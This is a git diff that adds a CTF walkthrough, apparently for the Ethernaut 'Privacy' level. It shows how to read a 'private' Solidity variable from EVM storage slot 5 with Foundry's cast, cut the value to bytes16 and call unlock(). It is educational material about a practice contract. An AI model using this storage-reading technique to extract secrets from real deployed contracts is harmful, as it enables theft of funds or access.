@@ -364,3 +364,61 @@ cast call $LEVEL_ADDRESS "top()" --rpc-url $RPC_URL --private-key $PKEY
 if return value is 1 means top is set to true.
 
 5. go on submit the instance, u're done.
+
+## level12 - Privacy
+
+1. to solve this level u need to have a good understanding of how storage slots work in evm.
+
+2. every storage slot in evm has a capacity of 32 bytes and if multiple variables of size less than 32 bytes are declared one after another, they'll be packed in a single slot until it's full or if variable can't fit in the remaining space.
+
+3. so as we can see here
+
+```solidity
+bool public locked = true;
+uint256 public ID = block.timestamp;
+uint8 private flattening = 10;
+uint8 private denomination = 255;
+uint16 private awkwardness = uint16(block.timestamp);
+bytes32[3] private data;
+```
+
+- first storage slot aka. storage slot 0 = locked
+- storage slot 1 = ID
+- storage slot 2 = flattening , denomination, awkwardness(8+8+16 = 32)
+- storage slot 3 = data[0]
+- storage slot 4 = data[1]
+- storage slot 5 = data[2]
+
+4.  to unlock we want the value of data[2] , so we'll inspect storage slot 5 to get the value
+
+```
+cast storage 0xC006acd08aB81c842Be8c4F8a00fe3A7A85fb42e 5 --rpc-url $RPC_URL
+```
+
+```
+0xdb301a79f36dbb45255b608d1bf403c4afd33c0da816c63b624d4904cc5a0533
+```
+
+5. now what we need to do is convert it to bytes16, use below function to do so
+
+```solidity
+function convert(bytes32 b) public pure returns (bytes16){
+     return bytes16(b);
+}
+```
+
+6. now pass the value u get after conversion to unlock() function
+
+```
+cast send $LEVEL_ADDRESS "unlock(bytes16 _key)"  0xdb301a79f36dbb45255b608d1bf403c4 --rpc-url $RPC_URL --private-key $PKEY
+```
+
+7. u can check if locked was successfully updated or not
+
+```
+cast storage $LEVEL_ADDRESS 0 --rpc-url $RPC_URL
+```
+
+if the value is 0 means it was updated successfully
+
+8. submit the instance, u're done.
